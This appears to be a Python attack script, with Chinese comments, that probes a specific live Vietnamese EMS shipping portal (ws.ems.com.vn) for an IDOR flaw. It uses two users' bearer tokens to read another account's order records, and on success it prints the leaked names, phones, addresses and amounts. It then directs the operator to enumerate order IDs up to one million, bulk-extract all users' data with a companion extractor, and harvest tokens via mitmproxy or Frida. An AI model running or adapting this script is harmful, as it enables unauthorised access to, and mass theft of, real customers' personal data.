#!/usr/bin/env python3
"""
EMS Portal - 后端验证测试
双Token测试：确认后端是否验证订单所有权
"""

import requests
import json
import sys
import time

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    print(f"""
{Colors.RED}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║       EMS Portal - 后端验证审计                             ║
║       测试: 后端是否验证订单所有权                          ║
╚══════════════════════════════════════════════════════════════╝
{Colors.RESET}

{Colors.YELLOW}测试原理:{Colors.RESET}
  1. 用账号B创建订单 → 获取订单ID
  2. 用账号A的Token尝试访问账号B的订单
  3. 如果成功 → 后端无验证 → IDOR!

{Colors.CYAN}需要: 两个真实账号的Token{Colors.RESET}
    """)

def test_backend_validation(token_a, token_b):
    """测试后端是否验证订单所有权"""
    
    base = "http://ws.ems.com.vn"
    
    print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}[第1步] 验证Token有效性{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
    
    # 验证TokenA
    print(f"[*] 验证TokenA...")
    r = requests.get(
        f"{base}/api/v1/orders/list",
        headers={"Authorization": f"Bearer {token_a}"},
        params={"limit": 1}
    )
    
    if r.status_code != 200 or r.json().get('code') != 'success':
        print(f"{Colors.RED}[!] TokenA无效: {r.json().get('message')}{Colors.RESET}")
        return False
    
    user_a_phone = None
    orders_a = r.json().get('data', {}).get('orders', [])
    if orders_a:
        user_a_phone = orders_a[0].get('phone')
    
    print(f"{Colors.GREEN}[+] TokenA有效 (电话: {user_a_phone}){Colors.RESET}")
    
    # 验证TokenB
    print(f"\n[*] 验证TokenB...")
    r = requests.get(
        f"{base}/api/v1/orders/list",
        headers={"Authorization": f"Bearer {token_b}"},
        params={"limit": 1}
    )
    
    if r.status_code != 200 or r.json().get('code') != 'success':
        print(f"{Colors.RED}[!] TokenB无效: {r.json().get('message')}{Colors.RESET}")
        return False
    
    user_b_phone = None
    orders_b = r.json().get('data', {}).get('orders', [])
    if orders_b:
        user_b_phone = orders_b[0].get('phone')
    
    print(f"{Colors.GREEN}[+] TokenB有效 (电话: {user_b_phone}){Colors.RESET}")
    
    # 检查是否是不同账号
    if user_a_phone and user_b_phone and user_a_phone == user_b_phone:
        print(f"\n{Colors.YELLOW}[!] 警告: TokenA和TokenB似乎是同一个账号{Colors.RESET}")
        print(f"{Colors.YELLOW}    需要两个不同账号才能测试越权{Colors.RESET}")
    
    # 使用账号B的现有订单（如果有）
    print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}[第2步] 获取账号B的订单{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
    
    r = requests.get(
        f"{base}/api/v1/orders/list",
        headers={"Authorization": f"Bearer {token_b}"},
        params={"limit": 10}
    )
    
    if r.status_code != 200 or r.json().get('code') != 'success':
        print(f"{Colors.RED}[!] 无法获取账号B的订单{Colors.RESET}")
        return False
    
    orders_b = r.json().get('data', {}).get('orders', [])
    
    if not orders_b:
        print(f"{Colors.YELLOW}[!] 账号B没有订单{Colors.RESET}")
        print(f"{Colors.YELLOW}    提示: 在App中用账号B创建一个订单后再测试{Colors.RESET}")
        return False
    
    # 选择一个订单
    test_order = orders_b[0]
    order_id = test_order.get('id')
    
    print(f"{Colors.GREEN}[+] 找到账号B的订单:{Colors.RESET}")
    print(f"    订单ID: {order_id}")
    print(f"    客户: {test_order.get('customer_name', 'N/A')}")
    print(f"    电话: {test_order.get('phone', 'N/A')}")
    print(f"    状态: {test_order.get('status', 'N/A')}")
    
    # 账号B确认可以访问
    print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}[第3步] 账号B访问自己的订单 (基准测试){Colors.RESET}")
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
    
    r = requests.get(
        f"{base}/api/v1/orders/tracking/{order_id}",
        headers={"Authorization": f"Bearer {token_b}"}
    )
    
    if r.status_code != 200:
        print(f"{Colors.RED}[!] 请求失败: HTTP {r.status_code}{Colors.RESET}")
        return False
    
    result_b = r.json()
    
    if result_b.get('code') == 'success':
        print(f"{Colors.GREEN}[+] 账号B可以访问自己的订单 (正常){Colors.RESET}")
        data_b = result_b.get('data', {})
        print(f"    客户: {data_b.get('customer_name', 'N/A')}")
        print(f"    电话: {data_b.get('phone', 'N/A')}")
    else:
        print(f"{Colors.RED}[!] 账号B无法访问自己的订单?{Colors.RESET}")
        print(f"    错误: {result_b.get('message')}")
        return False
    
    # 关键测试: 账号A尝试访问账号B的订单
    print(f"\n{Colors.RED}{'='*60}{Colors.RESET}")
    print(f"{Colors.RED}{Colors.BOLD}[第4步] 关键测试: 账号A尝试访问账号B的订单{Colors.RESET}")
    print(f"{Colors.RED}{'='*60}{Colors.RESET}\n")
    
    print(f"{Colors.YELLOW}正在用TokenA访问订单 {order_id}...{Colors.RESET}")
    
    time.sleep(1)
    
    r = requests.get(
        f"{base}/api/v1/orders/tracking/{order_id}",
        headers={"Authorization": f"Bearer {token_a}"}
    )
    
    if r.status_code != 200:
        print(f"{Colors.RED}[!] 请求失败: HTTP {r.status_code}{Colors.RESET}")
        return False
    
    result_a = r.json()
    
    # 分析结果
    print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}测试结果分析{Colors.RESET}")
    print(f"{Colors.BOLD}{'='*60}{Colors.RESET}\n")
    
    if result_a.get('code') == 'success':
        # 成功获取数据
        data_a = result_a.get('data', {})
        
        print(f"{Colors.RED}{Colors.BOLD}❌❌❌ 严重漏洞: IDOR越权确认! ❌❌❌{Colors.RESET}\n")
        
        print(f"{Colors.RED}账号A成功访问了账号B的订单!{Colors.RESET}\n")
        
        print(f"{Colors.YELLOW}泄露的数据:{Colors.RESET}")
        print(f"  订单ID: {data_a.get('id', 'N/A')}")
        print(f"  客户姓名: {data_a.get('customer_name', 'N/A')}")
        print(f"  电话: {data_a.get('phone', 'N/A')}")
        print(f"  地址: {data_a.get('address', 'N/A')}")
        print(f"  金额: {data_a.get('total', 'N/A')} VND")
        print(f"  状态: {data_a.get('status', 'N/A')}")
        
        print(f"\n{Colors.RED}{Colors.BOLD}漏洞详情:{Colors.RESET}")
        print(f"  类型: Insecure Direct Object Reference (IDOR)")
        print(f"  严重程度: {Colors.RED}CRITICAL{Colors.RESET}")
        print(f"  CVSS评分: {Colors.RED}9.1{Colors.RESET}")
        
        print(f"\n{Colors.RED}影响范围:{Colors.RESET}")
        print(f"  • 可以访问所有用户的订单")
        print(f"  • 泄露姓名、电话、地址")
        print(f"  • 商业敏感数据泄露")
        print(f"  • 用户隐私完全暴露")
        
        print(f"\n{Colors.YELLOW}利用方法:{Colors.RESET}")
        print(f"  1. 遍历订单ID (1-1000000)")
        print(f"  2. 批量提取所有用户数据")
        print(f"  3. 使用工具: mass_idor_extractor.py")
        
        print(f"\n{Colors.CYAN}修复建议:{Colors.RESET}")
        print(f"  1. 后端验证订单所有权")
        print(f"  2. 检查: order.user_id == token.user_id")
        print(f"  3. 返回403 Forbidden而非数据")
        
        return True
    
    elif result_a.get('code') == 'error':
        message = result_a.get('message', '')
        
        print(f"{Colors.GREEN}✅ 后端有权限验证{Colors.RESET}\n")
        
        print(f"错误响应:")
        print(f"  Code: {result_a.get('code')}")
        print(f"  Message: {message}")
        
        if 'unauthorized' in message.lower() or 'permission' in message.lower():
            print(f"\n{Colors.GREEN}验证类型: 明确的权限错误{Colors.RESET}")
            print(f"  后端正确检查了订单所有权")
            print(f"  并返回了权限错误")
        
        elif 'not found' in message.lower():
            print(f"\n{Colors.GREEN}验证类型: 通过Not Found隐藏{Colors.RESET}")
            print(f"  后端可能检查了所有权")
            print(f"  并返回了订单不存在错误")
            print(f"  (这是一种防信息泄露的做法)")
        
        else:
            print(f"\n{Colors.YELLOW}验证类型: 其他错误{Colors.RESET}")
            print(f"  可能有权限验证，但错误消息不明确")
        
        print(f"\n{Colors.GREEN}结论: 系统安全，无IDOR漏洞{Colors.RESET}")
        
        return False
    
    else:
        print(f"{Colors.YELLOW}❓ 意外响应{Colors.RESET}\n")
        print(f"完整响应:")
        print(json.dumps(result_a, indent=2, ensure_ascii=False))
        
        return None

def main():
    print_banner()
    
    if len(sys.argv) != 3:
        print(f"{Colors.YELLOW}用法:{Colors.RESET}")
        print(f"  python3 backend_validation_test.py <TOKEN_A> <TOKEN_B>\n")
        print(f"{Colors.YELLOW}参数:{Colors.RESET}")
        print(f"  TOKEN_A  账号A的Bearer Token")
        print(f"  TOKEN_B  账号B的Bearer Token\n")
        print(f"{Colors.CYAN}如何获取Token:{Colors.RESET}")
        print(f"  1. 使用MITM: mitmproxy -p 8080")
        print(f"  2. 使用Frida: python3 data_extraction_tool.py")
        print(f"  3. 在App中登录两个账号，分别提取Token\n")
        sys.exit(1)
    
    token_a = sys.argv[1]
    token_b = sys.argv[2]
    
    result = test_backend_validation(token_a, token_b)
    
    print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}测试完成{Colors.RESET}")
    print(f"{Colors.BOLD}{'='*60}{Colors.RESET}\n")
    
    if result is True:
        print(f"{Colors.RED}[!!!] 发现IDOR越权漏洞!{Colors.RESET}")
        print(f"{Colors.RED}可以进行批量数据提取!{Colors.RESET}")
        print(f"\n下一步:")
        print(f"  python3 mass_idor_extractor.py --token \"$TOKEN_A\" --mode smart")
    elif result is False:
        print(f"{Colors.GREEN}[✓] 后端有权限验证，系统安全{Colors.RESET}")
    else:
        print(f"{Colors.YELLOW}[?] 测试结果不确定，需要人工分析{Colors.RESET}")

if __name__ == '__main__':
    main()
